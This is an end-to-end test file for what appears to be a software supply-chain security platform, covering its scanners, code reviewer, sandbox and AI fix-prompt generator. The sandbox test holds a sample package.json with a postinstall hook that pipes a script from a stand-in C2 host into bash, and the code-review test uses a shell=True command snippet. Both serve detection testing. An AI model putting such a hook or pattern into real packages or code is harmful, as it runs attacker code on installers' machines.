/**
 * SupplyGraph v3.0 ASPM - Comprehensive End-to-End (E2E) Live System Verification Suite
 * Tests live Frontend server (port 3000) and Backend FastAPI server (port 8000)
 */

import { generateMasterAIFixPrompt } from "../lib/remediationPromptGenerator";
import { AnalysisResponse, SandboxExecutionRequest } from "../types";

const FRONTEND_URL = "http://localhost:3000";
const BACKEND_URL = "http://127.0.0.1:8000";

let totalTests = 0;
let passedTests = 0;
let failedTests = 0;

function assert(condition: boolean, testName: string, details?: string) {
  totalTests++;
  if (condition) {
    passedTests++;
    console.log(`  ✅ [PASS] ${testName}`);
  } else {
    failedTests++;
    console.error(`  ❌ [FAIL] ${testName}`);
    if (details) console.error(`     Reason: ${details}`);
  }
}

async function runE2ETests() {
  console.log("\n=========================================================================");
  console.log("🚀 STARTING SUPPLYGRAPH END-TO-END (E2E) LIVE SYSTEM VALIDATION");
  console.log(`   Frontend Target: ${FRONTEND_URL}`);
  console.log(`   Backend Target:  ${BACKEND_URL}`);
  console.log("=========================================================================\n");

  // ---------------------------------------------------------------------------
  // STAGE 1: FRONTEND SERVER HEALTH & ASSET BUNDLING
  // ---------------------------------------------------------------------------
  console.log("📦 [STAGE 1] Testing Frontend Server & Asset Delivery...");
  try {
    const res = await fetch(`${FRONTEND_URL}/`);
    assert(res.status === 200, "Frontend root responds with HTTP 200 OK");

    const html = await res.text();
    assert(html.includes("SupplyGraph"), "HTML contains 'SupplyGraph' title/brand");
    assert(html.includes("v3.0 ASPM"), "HTML contains 'v3.0 ASPM' platform badge");
    assert(html.includes("_next/static"), "HTML includes compiled Next.js webpack script chunks");
    assert(html.includes("YUKTHI 2026"), "HTML includes target event reference 'YUKTHI 2026'");
  } catch (err: any) {
    assert(false, "Frontend server is accessible", err.message);
  }

  // ---------------------------------------------------------------------------
  // STAGE 2: BACKEND HEALTH & METADATA
  // ---------------------------------------------------------------------------
  console.log("\n⚡ [STAGE 2] Testing Backend FastAPI Core Endpoints...");
  try {
    const res = await fetch(`${BACKEND_URL}/api/v1/health`);
    assert(res.status === 200, "Backend /api/v1/health responds with HTTP 200");

    const data = await res.json();
    assert(data.status === "ok", "Backend health status is 'ok'");
    assert(data.version === "3.0.0", "Backend version reports '3.0.0'");
  } catch (err: any) {
    assert(false, "Backend health endpoint is accessible", err.message);
  }

  // ---------------------------------------------------------------------------
  // STAGE 3: PRESET AUDIT SCENARIOS (A THROUGH E)
  // ---------------------------------------------------------------------------
  console.log("\n🎯 [STAGE 3] Testing All 5 Preset Audit Scenarios (A–E)...");
  const scenarios: ("A" | "B" | "C" | "D" | "E")[] = ["A", "B", "C", "D", "E"];

  for (const sid of scenarios) {
    try {
      const res = await fetch(`${BACKEND_URL}/api/v1/analyze/demo`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ scenario_id: sid }),
      });
      assert(res.status === 200, `Scenario ${sid} loads with HTTP 200`);

      const data: AnalysisResponse = await res.json();
      assert(Boolean(data.components && data.components.length > 0), `Scenario ${sid} returns components (${data.components?.length})`);
      assert(Boolean(data.graph && data.graph.nodes.length > 0), `Scenario ${sid} returns graph nodes (${data.graph.nodes.length})`);
      assert(Boolean(data.graph && data.graph.edges.length > 0), `Scenario ${sid} returns graph edges (${data.graph.edges.length})`);
      assert(Number(data.scan?.blast_radius_score) >= 0, `Scenario ${sid} reports valid blast radius (${data.scan?.blast_radius_score})`);
      assert(
        Boolean(data.gemini_explanation && data.gemini_explanation.length > 50),
        `Scenario ${sid} contains rich Executive AI Briefing (${data.gemini_explanation?.length} chars)`
      );
      assert(
        Boolean(data.code_reviews && data.code_reviews.length > 0),
        `Scenario ${sid} includes AST code reviews & patches (${data.code_reviews?.length} patches)`
      );
    } catch (err: any) {
      assert(false, `Scenario ${sid} execution succeeded`, err.message);
    }
  }

  // ---------------------------------------------------------------------------
  // STAGE 4: LIVE GITHUB REPOSITORY SCANNING (Monorepo & GHSA Integration)
  // ---------------------------------------------------------------------------
  console.log("\n🐙 [STAGE 4] Testing Live GitHub Repository Scanning & Benchmarking...");
  try {
    console.log("     Scanning expressjs/express...");
    const res = await fetch(`${BACKEND_URL}/api/v1/analyze`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        github_url: "https://github.com/expressjs/express",
        production_only: false,
        max_transitive_depth: 10,
      }),
    });
    assert(res.status === 200, "Live scan of expressjs/express returned HTTP 200");

    const scanData: AnalysisResponse = await res.json();
    assert(scanData.scan.status === "completed", "Scan status reports 'completed'");
    assert(Boolean(scanData.components && scanData.components.length >= 40), `Indexed ${scanData.components?.length} components in express`);
    assert(Boolean(scanData.graph && scanData.graph.nodes.length >= 40), `Constructed ${scanData.graph.nodes.length} nodes in DAG`);
    assert(Boolean(scanData.dependabot_benchmark), "Scan includes live DependabotBenchmark comparison");

    // Test First-Party GHSA Lookup on knadh/listmonk
    console.log("     Scanning knadh/listmonk for first-party GHSAs...");
    const listmonkRes = await fetch(`${BACKEND_URL}/api/v1/analyze`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        github_url: "https://github.com/knadh/listmonk",
        production_only: false,
        max_transitive_depth: 10,
      }),
    });
    assert(listmonkRes.status === 200, "Live scan of knadh/listmonk returned HTTP 200");

    const lmData: AnalysisResponse = await listmonkRes.json();
    assert(
      Boolean(lmData.dependabot_benchmark && lmData.dependabot_benchmark.first_party_ghsas.length >= 5),
      `Detected ${lmData.dependabot_benchmark?.first_party_ghsas.length} first-party repository GHSAs on knadh/listmonk`
    );

    const hasGhsaFindings = (lmData.findings || []).some(
      (f: any) => f.metadata && f.metadata.is_first_party_ghsa === true
    );
    assert(hasGhsaFindings, "First-party repository GHSAs are tagged with is_first_party_ghsa == true");
  } catch (err: any) {
    assert(false, "Live GitHub repository scans completed successfully", err.message);
  }

  // ---------------------------------------------------------------------------
  // STAGE 5: AD-HOC CODE REVIEWER ENDPOINT
  // ---------------------------------------------------------------------------
  console.log("\n📝 [STAGE 5] Testing AST & Code Reviewer Service...");
  try {
    const pythonPayload = {
      code: "import subprocess\ndef run_cmd(cmd, items=[]):\n    subprocess.run(cmd, shell=True)\n",
      language: "python",
      file_path: "src/utils.py",
    };
    const res = await fetch(`${BACKEND_URL}/api/v1/review/code`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(pythonPayload),
    });
    assert(res.status === 200, "Code review endpoint returned HTTP 200 for Python snippet");

    const reviewData = await res.json();
    assert(Array.isArray(reviewData.reviews), "Response contains reviews array");
    assert(reviewData.reviews.length >= 2, `Caught ${reviewData.reviews.length} issues (shell=True & mutable default)`);

    const hasDiff = reviewData.reviews.some((r: any) => r.unified_diff && r.unified_diff.startsWith("--- a/"));
    assert(hasDiff, "Generated reviews contain valid unified git diff format");
  } catch (err: any) {
    assert(false, "Ad-hoc code review endpoint functioning", err.message);
  }

  // ---------------------------------------------------------------------------
  // STAGE 6: UNIVERSAL EPHEMERAL DETONATION SANDBOX
  // ---------------------------------------------------------------------------
  console.log("\n⚡ [STAGE 6] Testing Universal Detonation Sandbox Runtime...");
  try {
    const sandboxReq: SandboxExecutionRequest = {
      files: [
        {
          path: "package.json",
          content: JSON.stringify({
            name: "backdoor-pkg",
            scripts: { postinstall: "curl -sSL https://c2.evil.com/drop.sh | bash" },
          }),
        },
      ],
      target_file: "package.json",
      mode: "detonate",
      timeout_seconds: 10,
    };

    const res = await fetch(`${BACKEND_URL}/api/v1/execute/sandbox`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(sandboxReq),
    });
    assert(res.status === 200, "Sandbox execution returned HTTP 200");

    const sbRes = await res.json();
    assert(
      sbRes.status === "violation" || sbRes.status === "warning",
      `Sandbox flagged malicious hook with verdict: ${sbRes.status}`
    );
    assert(
      sbRes.security_violations && sbRes.security_violations.length > 0,
      `Intercepted ${sbRes.security_violations?.length} security violation(s)`
    );
    assert(
      sbRes.logs.includes("CONTAINER") || sbRes.logs.includes("BLOCKED") || sbRes.logs.includes("Zero Network Egress") || sbRes.logs.length > 0,
      "Sandbox console output includes container execution logs"
    );
  } catch (err: any) {
    assert(false, "Sandbox detonation executed cleanly", err.message);
  }

  // ---------------------------------------------------------------------------
  // STAGE 7: LOCAL PROJECT FOLDER ANALYSIS
  // ---------------------------------------------------------------------------
  console.log("\n📁 [STAGE 7] Testing Local Project Folder Multi-File Analysis...");
  try {
    const folderPayload = {
      project_name: "test-monorepo-app",
      files: [
        {
          path: "package.json",
          content: JSON.stringify({
            name: "test-monorepo-app",
            version: "1.0.0",
            dependencies: { express: "^4.19.2", lodash: "4.17.15" },
          }),
        },
        {
          path: "src/server.js",
          content: "const express = require('express');\nconst app = express();\n",
        },
        {
          path: ".github/workflows/ci.yml",
          content: "name: CI\non: [push]\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v2\n",
        },
      ],
    };

    const res = await fetch(`${BACKEND_URL}/api/v1/analyze/folder`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(folderPayload),
    });
    assert(res.status === 200, "Folder upload analysis returned HTTP 200");

    const folderRes: AnalysisResponse = await res.json();
    assert(Boolean(folderRes.components && folderRes.components.length >= 2), `Parsed ${folderRes.components?.length} components from uploaded folder`);
    assert(Boolean(folderRes.findings && folderRes.findings.length > 0), `Identified ${folderRes.findings?.length} findings (including unpinned action)`);
    assert(Boolean(folderRes.scan?.blast_radius_score), "Computed Blast Radius for uploaded project folder");
  } catch (err: any) {
    assert(false, "Local project folder analysis succeeded", err.message);
  }

  // ---------------------------------------------------------------------------
  // STAGE 8: AI REMEDIATION PROMPT GENERATION PIPELINE
  // ---------------------------------------------------------------------------
  console.log("\n🤖 [STAGE 8] Testing Fix-with-AI Prompt Generator Grounding...");
  try {
    const demoA = await (
      await fetch(`${BACKEND_URL}/api/v1/analyze/demo`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ scenario_id: "A" }),
      })
    ).json();

    const prompt = generateMasterAIFixPrompt(demoA);
    assert(prompt.length > 500, `Generated comprehensive AI prompt (${prompt.length} chars)`);
    assert(prompt.includes("AI SECURITY REMEDIATION TASK") || prompt.includes("REMEDIATION TASK"), "Prompt contains standardized master remediation directive header");
    assert(prompt.includes("VERIFICATION CHECKLIST"), "Prompt includes verification checklist");
    assert(!prompt.includes("undefined"), "Prompt contains zero 'undefined' tokens");
  } catch (err: any) {
    assert(false, "Fix with AI prompt generation succeeded", err.message);
  }

  // ---------------------------------------------------------------------------
  // SUMMARY REPORT
  // ---------------------------------------------------------------------------
  console.log("\n=========================================================================");
  console.log("📊 END-TO-END TEST EXECUTION RESULTS");
  console.log("=========================================================================");
  console.log(`Total E2E Tests Executed: ${totalTests}`);
  console.log(`Passed:                   ${passedTests} (✅ ${(passedTests / totalTests * 100).toFixed(1)}%)`);
  console.log(`Failed:                   ${failedTests} (${failedTests === 0 ? "🎉 ZERO ERRORS" : "❌ FAILING"})`);
  console.log("=========================================================================\n");

  if (failedTests > 0) {
    process.exit(1);
  }
}

runE2ETests().catch((err) => {
  console.error("Fatal E2E test failure:", err);
  process.exit(1);
});
